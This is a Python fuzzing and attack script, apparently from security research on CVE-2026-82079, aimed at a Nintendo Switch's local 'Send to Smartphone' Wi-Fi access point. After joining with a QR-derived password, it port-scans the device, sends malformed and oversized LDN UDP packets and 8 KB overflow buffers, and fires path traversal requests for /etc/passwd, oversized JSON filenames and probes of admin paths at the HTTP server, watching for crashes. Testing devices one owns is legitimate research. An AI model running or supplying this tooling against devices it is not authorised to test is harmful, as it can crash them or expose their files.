#!/usr/bin/env python3
"""
LDN authenticated data fuzzer for CVE-2026-82079.

This fuzzer connects to the Switch AP as a regular WiFi client
(requires the WPA2-PSK password from QR code) and sends crafted
payloads through the network stack. This reaches deeper into the
LDN code than monitor-mode injection because:

  1. Data frames from associated clients are decrypted and processed
  2. The LDN sysmodule handles higher-layer protocol messages
  3. HTTP requests go through the full TCP/HTTP parsing stack

Attack layers (from easiest to reach to deepest):
  Layer 1: HTTP parser (via TCP to port 80)
  Layer 2: LDN protocol handler (via UDP or raw socket to LDN port)
  Layer 3: WiFi driver IE processing (via management frames)

This tool covers Layer 2 — crafted LDN protocol messages sent as
an associated WiFi client. Layer 1 is covered by http_overflow_probe.py.
Layer 3 is covered by wifi_frame_inject.py.

Requires:
    - PSK from QR code (in evidence/qr_analysis/wifi_credentials.json)
    - Switch in "Send to Smartphone" mode
    - PC connected to switch_* WiFi AP

Usage:
    python3 -I ldn_authenticated_fuzzer.py
    python3 -I ldn_authenticated_fuzzer.py --test udp_scan
    python3 -I ldn_authenticated_fuzzer.py --test tcp_scan
"""

import argparse
import json
import socket
import struct
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

SWITCH_IP = "192.168.0.1"
EVIDENCE_DIR = Path(__file__).parent.parent / "evidence" / "ldn_auth_fuzz"

# Known ports from baseline capture analysis
KNOWN_HTTP_PORT = 80
# Nintendo LDN typically uses these port ranges for local communication
LDN_PORT_RANGE = range(2020, 2030)  # UDP 2021 seen in baseline
MULTICAST_PORT = 2021  # Seen broadcasting from 10.0.0.3


def evidence_dir():
    EVIDENCE_DIR.mkdir(parents=True, exist_ok=True)
    return EVIDENCE_DIR


def save_result(name, data):
    path = evidence_dir() / f"{name}.json"
    with open(path, "w") as f:
        json.dump(data, f, indent=2, default=str)


def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


# ═══════════════════════════════════════════════════════════
# Network probes
# ═══════════════════════════════════════════════════════════

def tcp_connect(ip, port, timeout=2.0):
    """Attempt TCP connection, return (connected, banner)."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((ip, port))
        try:
            banner = sock.recv(1024)
        except socket.timeout:
            banner = b""
        return True, banner
    except (ConnectionRefusedError, socket.timeout, OSError):
        return False, b""
    finally:
        sock.close()


def udp_probe(ip, port, payload=b"\x00" * 16, timeout=2.0):
    """Send UDP payload and listen for response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        sock.sendto(payload, (ip, port))
        try:
            data, addr = sock.recvfrom(65536)
            return True, data, addr
        except socket.timeout:
            return False, b"", None
    except OSError as e:
        return False, str(e).encode(), None
    finally:
        sock.close()


def http_alive():
    """Quick HTTP server liveness check."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((SWITCH_IP, 80))
        sock.sendall(b"GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n")
        resp = sock.recv(4096)
        return b"200 OK" in resp or b"301" in resp or b"302" in resp or b"404" in resp
    except (ConnectionRefusedError, socket.timeout, OSError):
        return False
    finally:
        sock.close()


# ═══════════════════════════════════════════════════════════
# Port scan (from associated client perspective)
# ═══════════════════════════════════════════════════════════

def tcp_port_scan():
    """Scan Switch for open TCP ports (beyond port 80)."""
    log("TCP Port Scan of Switch AP (192.168.0.1)")
    results = {}

    # Common embedded device ports + Nintendo-specific
    ports = [
        20, 21, 22, 23, 25, 53, 67, 68, 80, 81, 443, 445,
        554, 1080, 1900, 2000, 2020, 2021, 2022, 2023, 2024, 2025,
        3000, 3001, 4000, 5000, 5353, 5555,
        8000, 8080, 8443, 8888,
        9000, 9100, 9999,
        49152, 49153, 49154,  # UPnP
    ]

    for port in ports:
        connected, banner = tcp_connect(SWITCH_IP, port, timeout=1.0)
        status = "open" if connected else "closed"
        entry = {"port": port, "status": status}
        if banner:
            entry["banner"] = banner[:256].hex()
            entry["banner_ascii"] = banner[:256].decode("ascii", errors="replace")
        results[port] = entry
        if connected:
            log(f"  TCP {port}: OPEN {'(' + entry.get('banner_ascii', '')[:40] + ')' if banner else ''}")

    save_result("tcp_scan", {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": SWITCH_IP,
        "results": results,
        "open_ports": [p for p, r in results.items() if r["status"] == "open"],
    })
    return results


def udp_port_scan():
    """Probe Switch for responding UDP ports."""
    log("UDP Port Probe of Switch AP (192.168.0.1)")
    results = {}

    # LDN-related + standard ports
    ports = [
        53, 67, 68, 123, 137, 138, 161,
        1900,  # UPnP/SSDP
        2020, 2021, 2022, 2023, 2024, 2025,  # LDN range
        5353,  # mDNS
        5355,  # LLMNR
    ]

    # Different probe payloads per port type
    for port in ports:
        if port == 53:
            # DNS query for "switch.local"
            payload = (
                b"\x12\x34"  # transaction ID
                b"\x01\x00"  # standard query
                b"\x00\x01\x00\x00\x00\x00\x00\x00"  # 1 question
                b"\x06switch\x05local\x00"  # switch.local
                b"\x00\x01\x00\x01"  # type A, class IN
            )
        elif port == 1900:
            # SSDP M-SEARCH
            payload = (
                b"M-SEARCH * HTTP/1.1\r\n"
                b"HOST: 239.255.255.250:1900\r\n"
                b"MAN: \"ssdp:discover\"\r\n"
                b"MX: 2\r\n"
                b"ST: ssdp:all\r\n"
                b"\r\n"
            )
        elif port == 5353:
            # mDNS query for _http._tcp.local
            payload = (
                b"\x00\x00"  # transaction ID
                b"\x00\x00"  # standard query
                b"\x00\x01\x00\x00\x00\x00\x00\x00"
                b"\x05_http\x04_tcp\x05local\x00"
                b"\x00\x0c\x00\x01"  # PTR, IN
            )
        elif 2020 <= port <= 2025:
            # LDN probe: try different version/type combos
            payload = struct.pack("<BBHI", 0x01, 0x00, 0x0000, 0x00000000)
        else:
            payload = b"\x00" * 16

        responded, data, addr = udp_probe(SWITCH_IP, port, payload, timeout=1.5)
        entry = {"port": port, "responded": responded}
        if responded:
            entry["response_len"] = len(data)
            entry["response_hex"] = data[:256].hex()
            entry["from_addr"] = str(addr)
            log(f"  UDP {port}: RESPONDED ({len(data)}B from {addr})")
        results[port] = entry

    save_result("udp_scan", {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": SWITCH_IP,
        "results": results,
        "responding_ports": [p for p, r in results.items() if r["responded"]],
    })
    return results


# ═══════════════════════════════════════════════════════════
# LDN protocol fuzzing (over UDP)
# ═══════════════════════════════════════════════════════════

def ldn_udp_fuzz():
    """Send crafted LDN protocol messages via UDP."""
    log("LDN UDP Protocol Fuzz")

    # From baseline capture: UDP port 2021 had broadcast traffic
    # Try sending LDN-formatted messages to the Switch
    target_ports = [2020, 2021, 2022]
    results = []

    for port in target_ports:
        log(f"\n  Port {port}:")

        test_payloads = [
            ("ldn_scan_request", struct.pack("<BBH", 0x01, 0x00, 0x0000)),
            ("ldn_connect", struct.pack("<BBI", 0x01, 0x02, 0x00000000)),
            ("ldn_disconnect", struct.pack("<BB", 0x01, 0x03)),
            ("ldn_data_small", struct.pack("<BBH", 0x01, 0x04, 0x0010) + b"\xCC" * 16),
            ("ldn_data_1024", struct.pack("<BBH", 0x01, 0x04, 0x0400) + b"\xCC" * 1024),
            ("ldn_data_4096", struct.pack("<BBH", 0x01, 0x04, 0x1000) + b"\xCC" * 4096),
            ("ldn_data_oversized",
             struct.pack("<BBH", 0x01, 0x04, 0xFFFF) + b"\xDD" * 8192),
            ("ldn_version_0", struct.pack("<BBH", 0x00, 0x00, 0x0000)),
            ("ldn_version_255", struct.pack("<BBH", 0xFF, 0x00, 0x0000)),
            ("raw_overflow", b"\x41" * 8192),
        ]

        for name, payload in test_payloads:
            responded, data, addr = udp_probe(SWITCH_IP, port, payload, timeout=1.0)
            entry = {
                "port": port,
                "name": name,
                "payload_size": len(payload),
                "responded": responded,
                "timestamp": datetime.now(timezone.utc).isoformat(),
            }
            if responded:
                entry["response_len"] = len(data)
                entry["response_hex"] = data[:256].hex()
                log(f"    {name}: RESPONDED {len(data)}B")
            else:
                log(f"    {name}: no response")
            results.append(entry)

        # Check HTTP still alive after each port's tests
        alive = http_alive()
        if not alive:
            log(f"  HTTP server DOWN after port {port} tests!")
            results.append({"port": port, "crash_detected": True,
                            "timestamp": datetime.now(timezone.utc).isoformat()})
            break

    save_result("ldn_udp_fuzz", {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": SWITCH_IP,
        "results": results,
        "responses": sum(1 for r in results if r.get("responded")),
        "crashes": sum(1 for r in results if r.get("crash_detected")),
    })
    return results


# ═══════════════════════════════════════════════════════════
# HTTP-layer LDN fuzzing
# ═══════════════════════════════════════════════════════════

def http_ldn_fuzz():
    """Fuzz the HTTP server with LDN-specific payloads.

    The data.json endpoint returns JSON with file listings.
    What if we POST data back? Or request unexpected paths
    that mirror the LDN protocol?
    """
    log("HTTP LDN-specific Fuzzing")

    results = []

    test_requests = [
        ("post_data_json", b"POST /data.json HTTP/1.1\r\n"
         b"Host: 192.168.0.1\r\nContent-Length: 100\r\n"
         b"Content-Type: application/json\r\n\r\n"
         + b'{"FileType":"photo","FileNames":["' + b"A" * 64 + b'"]}'),

        ("post_root", b"POST / HTTP/1.1\r\nHost: 192.168.0.1\r\n"
         b"Content-Length: 1024\r\n\r\n" + b"\x00" * 1024),

        ("put_data_json", b"PUT /data.json HTTP/1.1\r\n"
         b"Host: 192.168.0.1\r\nContent-Length: 50\r\n\r\n"
         + b'{"FileType":"movie","FileNames":["evil.mp4"]}'),

        ("get_ldn_scan", b"GET /ldn/scan HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"),
        ("get_ldn_connect", b"GET /ldn/connect HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"),
        ("get_api_v1", b"GET /api/v1/status HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"),
        ("get_debug", b"GET /debug HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"),
        ("get_admin", b"GET /admin HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"),
        ("get_config", b"GET /config HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"),

        # Path traversal (might reveal filesystem if vulnerable)
        ("traversal_etc_passwd",
         b"GET /../../etc/passwd HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"),
        ("traversal_encoded",
         b"GET /%2e%2e/%2e%2e/etc/passwd HTTP/1.1\r\nHost: 192.168.0.1\r\n\r\n"),

        # Oversized JSON filename (targets data.json parsing if POST is processed)
        ("post_huge_filename", b"POST /data.json HTTP/1.1\r\n"
         b"Host: 192.168.0.1\r\nContent-Type: application/json\r\n"
         b"Content-Length: 10000\r\n\r\n"
         + b'{"FileType":"photo","FileNames":["' + b"X" * 9000 + b'"]}'),

        # WebSocket upgrade attempt
        ("websocket_upgrade",
         b"GET / HTTP/1.1\r\nHost: 192.168.0.1\r\n"
         b"Upgrade: websocket\r\nConnection: Upgrade\r\n"
         b"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
         b"Sec-WebSocket-Version: 13\r\n\r\n"),
    ]

    for name, raw_req in test_requests:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        entry = {"name": name, "req_size": len(raw_req),
                 "timestamp": datetime.now(timezone.utc).isoformat()}

        try:
            sock.connect((SWITCH_IP, 80))
            sock.sendall(raw_req)
            resp = b""
            try:
                while True:
                    d = sock.recv(65536)
                    if not d:
                        break
                    resp += d
            except socket.timeout:
                pass

            if resp:
                # Parse status code
                try:
                    status_line = resp.split(b"\r\n", 1)[0].decode()
                    entry["status_line"] = status_line
                    entry["status_code"] = int(status_line.split(" ", 2)[1])
                except (ValueError, IndexError):
                    entry["status_line"] = resp[:80].decode("ascii", errors="replace")
                entry["response_size"] = len(resp)
                entry["result"] = "responded"
                log(f"  {name}: {entry.get('status_code', '?')} ({len(resp)}B)")
            else:
                entry["result"] = "empty"
                log(f"  {name}: empty response")

        except ConnectionRefusedError:
            entry["result"] = "refused"
            log(f"  {name}: connection refused")
        except socket.timeout:
            entry["result"] = "timeout"
            log(f"  {name}: timeout")
        except OSError as e:
            entry["result"] = "error"
            entry["error"] = str(e)
            log(f"  {name}: {e}")
        finally:
            sock.close()

        results.append(entry)

        # Crash check
        if entry["result"] in ("refused", "timeout", "error"):
            time.sleep(1)
            if not http_alive():
                log(f"  SERVER DOWN after {name}!")
                entry["crash_suspected"] = True
                break

    save_result("http_ldn_fuzz", {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target": SWITCH_IP,
        "results": results,
    })
    return results


# ═══════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="LDN authenticated data fuzzer (CVE-2026-82079)")
    parser.add_argument("--test",
                        choices=["all", "tcp_scan", "udp_scan", "udp_fuzz",
                                 "http_fuzz"],
                        default="all", help="Which tests to run")
    args = parser.parse_args()

    log("LDN Authenticated Fuzzer — CVE-2026-82079")
    log(f"Target: {SWITCH_IP}")

    if args.test in ("all", "tcp_scan"):
        tcp_port_scan()

    if args.test in ("all", "udp_scan"):
        udp_port_scan()

    if args.test in ("all", "udp_fuzz"):
        if not http_alive():
            log("HTTP server not reachable. Ensure Switch is in Send mode.")
            if args.test == "udp_fuzz":
                sys.exit(1)
        else:
            ldn_udp_fuzz()

    if args.test in ("all", "http_fuzz"):
        if not http_alive():
            log("HTTP server not reachable. Ensure Switch is in Send mode.")
            if args.test == "http_fuzz":
                sys.exit(1)
        else:
            http_ldn_fuzz()

    log("\nAll tests complete. Results in evidence/ldn_auth_fuzz/")


if __name__ == "__main__":
    main()
